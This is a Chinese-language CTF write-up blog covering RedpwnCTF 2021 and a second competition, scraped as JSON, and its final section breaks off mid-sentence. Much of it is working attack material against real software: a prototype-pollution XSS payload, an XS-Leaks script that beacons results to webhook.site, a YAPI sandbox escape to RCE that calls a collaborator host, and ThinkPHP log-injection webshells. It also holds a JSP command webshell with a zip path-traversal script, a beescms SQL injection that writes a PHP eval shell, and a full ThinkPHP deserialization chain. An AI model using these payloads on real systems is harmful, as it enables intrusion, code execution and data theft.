{}[\u0026#34;__proto__\u0026#34;][\u0026#34;message\u0026#34;] = \u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34;; 当请求被触发时，error和message就都是我们自定的值了；虽然DOMPurify会对__proto__进行移除，但是因为上面const fieldsetName = decodeURIComponent(fieldset.name);，所以再对__proto__来一手urlencode就能绕过了\n\u0026lt;form\u0026gt; \u0026lt;fieldset name=\u0026#34;%255F_proto__\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;error\u0026#34; value=\u0026#34;1\u0026#34; /\u0026gt; \u0026lt;input name=\u0026#34;message\u0026#34; value=\u0026#34;\u0026lt;img src=x onerror=\u0026#39;alert(1)\u0026#39;\u0026gt;\u0026#34; /\u0026gt; \u0026lt;input value=\u0026#34;Post Comment\u0026#34; type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/fieldset\u0026gt; \u0026lt;/form\u0026gt; ***web/pastebin-3  Boy, there sure are a lot of pastebins. Gotta think of new themes\u0026hellip;\nPlease put a reasonably secure password when making an account\n 还是一个很简单的页面 create paste，增加了一个搜索的功能\n先看/view路由\n我们的便签 总体会以一个url的形式放入iframe中，接着去看看sanbox_url的渲染情况\n而亮点是，我们的paste又被直接放入反引号中间了，如果我们用类似${alert(1)}的东西直接就可以跑js了！\n现在我们有了可以操作js代码的地方——但是这是在sandbox中，与主页面并不是同源的🤔\n再看看新加入的search功能\n————这里要先插播一条知识了 XSLeaks（更多的相关参考链接放到后面了），一个常见的xsleak攻击详见error events\nCross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web’s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user. ——from XSLeaks wiki\n/search使用的是flask中的flash()消息闪现来展示搜索的结果，它会存储在session cookie中，如果消息比会话cookie大的话会导致消息闪现静默失败——我们利用这一条特性，用长长的cookie，如果请求成功 那么需要显示flash时cookie将会超过限制报错，而请求失败 就只有No results found短短的一条，不会报400\n我们用XSLeaks wiki上给出的 probeError snippet\nfunction probeError(url) { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; console.log(\u0026#39;Onload event triggered\u0026#39;); script.onerror = () =\u0026gt; console.log(\u0026#39;Error event triggered\u0026#39;); document.head.appendChild(script); } 虽然同站的cookies（same-site cookies）通常会阻止这种情况，但由于题中的sandbox是子域，并不是同站的情况，所以probeError可以检测到，下面是脚本\nconst alphabet = \u0026#34;abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;; function set() { document.cookie = `a=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` document.cookie = `b=${\u0026#39;a\u0026#39;.repeat(4096-90)}; domain=.pastebin-3.mc.ax` } function unset() { document.cookie = `a=; domain=.pastebin-3.mc.ax` document.cookie = `b=; domain=.pastebin-3.mc.ax` } function probeError(url) { return new Promise(resolve =\u0026gt; { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = url; script.onload = () =\u0026gt; resolve(false); script.onerror = () =\u0026gt; resolve(true); document.head.appendChild(script); }); } function wait(time) { return new Promise(resolve =\u0026gt; { setTimeout(resolve, time); }); } (async () =\u0026gt; { let prefix = \u0026#34;flag{c00k13_b0mb1n6_15_f4k3_vu\u0026#34;; set(); navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded\u0026#39;); while (!prefix.endsWith(\u0026#39;}\u0026#39;)) { for (let i = 0; i \u0026lt; alphabet.length; i++) { let attempt = prefix + alphabet[i]; let subwindow = window.open(\u0026#34;https://pastebin-3.mc.ax/search?query=\u0026#34; + encodeURIComponent(attempt)); await wait(500); subwindow.close(); if (await probeError(\u0026#34;https://pastebin-3.mc.ax/home\u0026#34;)) { navigator.sendBeacon(\u0026#39;https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?\u0026#39; + attempt); unset(); prefix = attempt; break; } } } })(); 为了引入这个脚本，我们新建一个paste\n${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)} 其他几个版本的脚本：ver2 ver3\n参考：XSLeaks | Side Channel Vulnerabilities on the Web - Detection and Preventio | Flask 消息闪现\nweb/wtjs  Ya like golf? How about JS golf?\nwtjs.mc.ax | Admin bot\nDownloads: wtjs.tar\n ………………有字数限制的fuckjs，我不会构造 太痛苦了\nwp参见一张google sheet wp2\n不得不说，这个sheet真的是相当清晰了……用9张表 详细的写了一下到底是怎么把最终的payload给拼出来的，真的是现代版活字印刷 绝了 数字民工是吧😅\n属实是蚌埠住了😅\n***web/MdBin  Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologies™, including React, this pastebin has you covered, with brand-new theming support!\nmdbin.mc.ax\nSubmit to the admin at admin-bot.mc.ax/mdbin; the flag is in a cookie.\nDownloads: mdbin.tar.gz\n 参考：wp1 wp2\n直接放参考的wp链接吧，还是js原型污染的问题，但是由于我对js原型污染这个问题了解的不够深入，也只能照猫画虎的复现，还有很多资料需要额外的去补充地看，就不班门弄斧了，上面的两个链接里写的都很好！\n***web/lazy-admin  Looks like another service with no functionality. I hope the admin is doing their job\u0026hellip;\nlazy-admin.mc.ax\nDownloads: lazy-admin.tar.gz\n 参考：wp\n难，我不懂\nmisc/sanity-check  I get to write the sanity check challenge! Alright!\nflag{1_l0v3_54n17y_ch3ck_ch4ll5}\n misc/discord  Join the discord! I hear #rules is an incredibly engaging read.\n misc/compliant-lattice-feline  get a flag! nc mc.ax 31443\n *misc/the-substitution-game  nc mc.ax 31996\nDownloads: chall.py\n Markov Algorithm罢了\n参见：Markov Algorithm Online\nmisc/annaBEL-lee  sounds from a kingdom by the sea\nThe server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.\nWhat exactly is the server sending? Sometimes it makes a sound, sometimes it doesn\u0026rsquo;t. Plotting it on a chart might help you see something.\nIt might be helpful to turn your sound on, but you\u0026rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enough—maybe slow it down to get a better idea.\nThis is not audio steganography. Apologies if anyone went down that route.\nnc mc.ax 31845\n nc连入后没有任何可视的回显，但是藏在了声音信息里\n\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x00\\x00\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x07\\x07\\x00\\x07\\x00\\x07\\x07\\x07\\x00\\x00\\x00 导出，有两种值：no bell(\\x00) bell(\\x07)，转化为0与1\n101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000 改为莫斯电码的样子\n.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.- 解密\nLETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L) flag{d1ng-d0n9-g0es-th3-anna-b3l}\ncrypto/scissor  I was given this string and told something about scissors. egddagzp_ftue_rxms_iuft_rxms_radymf\nDownloads: encrypt.py\n crypto/baby  I want to do an RSA!\nDownloads: output.txt\n n: 228430203128652625114739053365339856393 e: 65537 c: 126721104148692049427127809839057445790 一点都不会crypto…… 其实查一下RSA n e c其实就能做出来后面的东西了\nRSA decryption using only n e and c 然后就会知道这个东西 Ganapati/RsaCtfTool，或者这个在线网站 RSA Cipher\n为了decode首先需要根据N求出两个互质的p和q，可以用这个网站来做 整数分解工具\n之后就可以愉快的解密了！\nrev/wstrings  Some strings are wider than normal\u0026hellip;\nDownloads: wstrings\n flag{n0t_al1_str1ngs_ar3_sk1nny}\nrev/bread-making  My parents aren\u0026rsquo;t home! Quick, help me make some bread please\u0026hellip; nc mc.ax 31796\nDownloads: bread\n 参考：wp2 wp3 wp4\n我当时的思路和想法大致还是对的，~~（虽然没有做出来吧）~~这个就是先提取出文件中的字符串部分，然后用逻辑 在交互模式下用正确的顺序输入 完整的顺下来这个流程，最后拿到flag，最后的正确顺序是这样的\nadd ingredients to the bowl add flour add yeast add salt add water hide the bowl inside a box wait 3 hours work in the basement preheat the toaster oven set a timer on your phone watch the bread bake pull the tray out with a towel unplug the fire alarm open the window unplug the oven clean the counters flush the bread down the toilet wash the sink get ready to sleep close the window replace the fire alarm brush teeth and go to bed The flag is: flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}\n调试的过程是linux下的py脚本\nfrom pwn import * p = remote(\u0026quot;mc.ax\u0026quot;, 31796) p.sendlineafter(\u0026quot;bowl\u0026quot;, \u0026quot;add flour\u0026quot;) p.sendlineafter(\u0026quot;flour has been added\u0026quot;, \u0026quot;add yeast\u0026quot;) p.sendlineafter(\u0026quot;yeast has been added\u0026quot;, \u0026quot;add salt\u0026quot;) p.sendlineafter(\u0026quot;salt has been added\u0026quot;, \u0026quot;add water\u0026quot;) p.sendlineafter(\u0026quot;lumpy dough\u0026quot;, \u0026quot;hide the bowl inside a box\u0026quot;) p.sendlineafter(\u0026quot;to rise\u0026quot;, \u0026quot;wait 3 hours\u0026quot;) p.sendlineafter(\u0026quot;finish the dough\u0026quot;, \u0026quot;work in the basement\u0026quot;) p.sendlineafter(\u0026quot;needs to be baked\u0026quot;, \u0026quot;preheat the toaster oven\u0026quot;) p.sendlineafter(\u0026quot;for 45 minutes\u0026quot;, \u0026quot;set a timer on your phone\u0026quot;) p.sendlineafter(\u0026quot;awfully long time\u0026quot;, \u0026quot;watch the bread bake\u0026quot;) p.sendlineafter(\u0026quot;no time to waste\u0026quot;, \u0026quot;pull the tray out with a towel\u0026quot;) p.sendlineafter(\u0026quot;smoke in the air\u0026quot;, \u0026quot;unplug the fire alarm\u0026quot;) p.sendlineafter(\u0026quot;in another room\u0026quot;, \u0026quot;open the window\u0026quot;) p.sendlineafter(\u0026quot;air rushes in\u0026quot;, \u0026quot;unplug the oven\u0026quot;) p.sendlineafter(\u0026quot;kitchen is a mess\u0026quot;, \u0026quot;wash the sink\u0026quot;) p.sendlineafter(\u0026quot;sink is cleaned\u0026quot;, \u0026quot;clean the counters\u0026quot;) p.sendlineafter(\u0026quot;counters are cleaned\u0026quot;, \u0026quot;flush the bread down the toilet\u0026quot;) p.sendlineafter(\u0026quot;is disposed of\u0026quot;, \u0026quot;get ready to sleep\u0026quot;) p.sendlineafter(\u0026quot;go to sleep\u0026quot;, \u0026quot;close the window\u0026quot;) p.sendlineafter(\u0026quot;window is closed\u0026quot;, \u0026quot;replace the fire alarm\u0026quot;) p.sendlineafter(\u0026quot;alarm is replaced\u0026quot;, \u0026quot;brush teeth and go to bed\u0026quot;) p.interactive() p.close() 这个脚本的逻辑是通过bread文件导出的文本，找出最符合逻辑的上下文 然后利用sendlineafer来解题；实际做题的话不可能只靠打字来试这个顺序 不是说试这个浪费时间 而是等待的时间非常非常短暂 没有完整打完字的时间\n后记 这次的redpwn有47道题，各个方向都有适合我这种签到选手的简单题，好评~\n就是打星号的题涉及到的js原型污染问题，光靠这一两个题搞不太懂，但是最近的反序列化问题还没总结完，三心二意的也不太好，但是之后一定会回来看的！！！等着被鞭尸吧 哼\n","date":"2021-08-08T20:08:39+08:00","permalink":"https://amiaaaz.github.io/2021/08/08/redpwn2021-wp/","section":"posts","tags":["wp"],"title":"RedpwnCTF2021 Wp"},{"categories":["CTF"],"contents":"cat flag  简简单单cat flag\nHint: 管理员曾访问过flag\n \u0026lt;?php if (isset($_GET[\u0026#39;cmd\u0026#39;])) { $cmd = $_GET[\u0026#39;cmd\u0026#39;]; if (!preg_match(\u0026#39;/flag/i\u0026#39;,$cmd)) { $cmd = escapeshellarg($cmd); system(\u0026#39;cat \u0026#39; . $cmd); } } else { highlight_file(__FILE__); } ?\u0026gt;提示管理员访问过，先cat /var/log/nginx/access.log\n之后用%fa绕过 /?cmd=this_is_final_fl%faag_e2a457126032b42d.php\nreview - Nginx 重要文件目录：\n 配置文件存放目录：/etc/nginx 主要配置文件：/etc/nginx/conf/nginx.conf 管理脚本：/usr/lib64/systemd/system/nginx.service 模块：/usr/lisb64/nginx/modules 应用程序：/usr/sbin/nginx 程序默认存放位置：/usr/share/nginx/html 日志默认存放位置：/var/log/nginx/access.log  ezrce  你真的会 nodejs 吗？\n 是一个YAPI的主页，根据题目里rce的提示 搜搜看已知的漏洞：Yapi 存在远程命令执行漏洞\n那就好办了 跟着来就行咯；首先创建一个项目\n之后修改全局mock脚本\nconst sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const myfun = FunctionConstructor(\u0026#39;return process\u0026#39;) const process = myfun() mockjson = process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;command\u0026#34;).toString() 之后添加接口\n脚本中的execSync()处可rce，先用wget http://xxxxx.burpcollaborator.net试试水\n很顺利嘛 好耶！\ncat `ls`\t// spawnSync /bin/sh ENOBUFS cat `cd ../;ls`\t// config.json, init.lock, log, vendors cat `cd ../../;ls`\t// app, bin, boot, dev, etc, ffffffflllllaggggg, home, lib, lib64, media, mnt, opt, proc, root, run, sbin, srv, start.sh, tmp, usr, var cd ../../;cat `ls`\t// app, bin,boot, dev, etc, home, lib, lib64, media, mnt,opt, proc, root, run, sbin, srv, sys, tmp, usr, var cat `cd ../../;cat ffffffflllllaggggg`\t// flag{5d096f4f-8c32-49b6-bed4-b485eb1cf08b} easythinkphp  easythinkphp\n 只有一个thinkphp 3.2.3的欢迎页面，tp的洞很多 可以直接拿来打，参考：【漏洞通报】ThinkPHP3.2.x RCE漏洞通报\n/index.php?m=--\u0026gt;\u0026lt;?=phpinfo();?\u0026gt; /index.php?m=Home\u0026amp;c=Index\u0026amp;a=index\u0026amp;value[_filename]=./Application/Runtime/Logs/Common/21_08_01.log 先验证一下文档中的方法，成功，之后把phpinfo换成自己的一句话木马\n/index.php?m=--\u0026gt;\u0026lt;?=eval($_POST['wuhu']);?\u0026gt; 传入后 用蚁剑连接就能拿flag了~\n或者也可以直接使用ThinkphpGUI一把梭！一键getshell 你值得拥有\njspxcms 也有现成的洞可以直接用，参考：复现jspxcms解压getshell漏洞 | 代码审计| Jspxcms文件上传漏洞(CNVD-2019-40540) | 记一次由追踪溯源发现的“不安全解压getshell”\n首先构造含jsp🐎的恶意war包，🐎长这样\n\u0026lt;% if(\u0026quot;023\u0026quot;.equals(request.getParameter(\u0026quot;pwd\u0026quot;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\u0026quot;wuhu\u0026quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(\u0026quot;\u0026lt;pre\u0026gt;\u0026quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\u0026quot;\u0026lt;/pre\u0026gt;\u0026quot;); } %\u0026gt; 之后放入一个解压后会自动完成目录穿越的zip包中 这个过程由py脚本完成\nimport zipfile if __name__ == \u0026#34;__main__\u0026#34;: try: binary = b\u0026#39;\u0026lt;script\u0026gt;alert(\u0026#34;helloworld\u0026#34;)\u0026lt;/script\u0026gt;\u0026#39; zipFile = zipfile.ZipFile(\u0026#34;test123.zip\u0026#34;, \u0026#34;a\u0026#34;, zipfile.ZIP_DEFLATED) info = zipfile.ZipInfo(\u0026#34;test123.zip\u0026#34;) zipFile.writestr(\u0026#34;../../../../dog123.html\u0026#34;, binary) zipFile.close() except IOError as e: raise e import zipfile z = zipfile.ZipFile(\u0026#39;test123.zip\u0026#39;, \u0026#39;a\u0026#39;, zipfile.ZIP_DEFLATED) with open(\u0026#39;wuhu.war\u0026#39;, \u0026#39;rb\u0026#39;)as f: temp = f.read() z.writestr(\u0026#39;../../../../wuhu.war\u0026#39;, temp) z.close() 需要注意的是 最终我们要穿越到的目录是网站根目录的上层，即webapps目录下 与ROOT目录同级，当war包位于这个目录下才会自动部署\n直接cat /flag就好啦\ncybercms  赛博CMS，只为安全而生\nHint：信息搜集是一个web手必备的技能\n 一个（伪）cms平台介绍的页面，比较简陋，首页/应用案例处显示hacked by ymnh，在ymnh的咨询页面处有这样的报错\n在首页/新闻动态处，几乎所有的帖子都是hacked by xxx~~（本来我还以为是多么复杂的长篇大论）~~，在如何安装和使用模板这篇下有没删干净的东西\n如何设置进站语言这篇里竟然是这样的草 真是蚌埠住了 图穷匕见了属于是2333333\n根据这些，可以得知整个站是完全移植/套壳beescms的 所以接着去找已存在的洞，参考：Beescms_v4.0 sql注入漏洞分析\n在admin后加单引号，提示表名是bees_admin，有id, admin_name, admin_password, admin_purview, is_disable共5个字段\n简单fuzz可知：过滤了空格（用/**/绕过）（或者用tab绕过 或者%0a绕过 都可以），过滤了select, outfile（双写绕过），对尖括号转义为html实体（用hex绕过）\nuser=admin'/**/union/**/selselectect/**/1,2,3,4,5# 回显正常，接着尝试写入shell（这里要写清楚绝对路径，在上面的一张报错的页面也有所提示了）\nadmin'/**/union/**/selselectect/**/1,2,3,4,0x3c3f3d6576616c28245f504f53545b2777756875275d293b3f3e/**/into/**/ououtfiletfile/**/'/var/www/html/wuhu.php'# 好耶，连蚁剑拿flag咯\nez_website  简单的题目\n 也是现实世界存在的东西，参考：齐博建站系统x1.0代码审计\n直接用已有的链子打\n\u0026lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u0026gt;files = [$files]; //$file =\u0026gt; /think/Model的子类new Pivot(); Model是抽象类  } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u0026gt;parent = $output; //$this-\u0026gt;parent=\u0026gt; think\\console\\Output;  $this-\u0026gt;append = array(\u0026#34;xxx\u0026#34;=\u0026gt;\u0026#34;getError\u0026#34;); //调用getError 返回this-\u0026gt;error  $this-\u0026gt;error = $modelRelation; // $this-\u0026gt;error 要为 relation类的子类，并且也是OnetoOne类的子类==\u0026gt;\u0026gt;HasOne  } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u0026gt;selfRelation = 0; $this-\u0026gt;query = $query; //$query指向Query  $this-\u0026gt;bindAttr = [\u0026#39;xxx\u0026#39;];// $value值，作为call函数引用的第二变量  } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u0026gt;model = $model; //$this-\u0026gt;model=\u0026gt; think\\console\\Output;  } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u0026gt;styles = [\u0026#39;getAttr\u0026#39;]; $this-\u0026gt;handle =$handle; //$handle-\u0026gt;think\\session\\driver\\Memcached  } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u0026gt;handler = $handle; //$handle-\u0026gt;think\\cache\\driver\\File  } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u0026gt;options=[ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../runtime/temp/a.php\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, ]; $this-\u0026gt;tag = \u0026#39;xxx\u0026#39;; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } 上传\n/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A135%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Ftemp%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D 虽然会返回一个报错的页面，但是可以在/index.php/index/image/headers?url=file:///var/www/html/runtime/temp/a.php12ac95f1498ce51d2d96a249c09c1998.php处验证一下是否写上了🐎，文件名字是md5('tag_'.md5($this-\u0026gt;tag))，连接密码是ccc 直接蚁剑\n在雪殇的wp中用的是另一个，更直接的写🐎方式，下面说一下思路（大概\n我们可以先尝试看看敏感函数file_put_contents()是否能利用\n在application/admin/controller/Upgrade.php下看到了文件写入的函数，它位于在writelog()中，这个函数的功能是处理post请求传入的各项参数\n这个config('client_upgrade_edition')捏，跟了一下 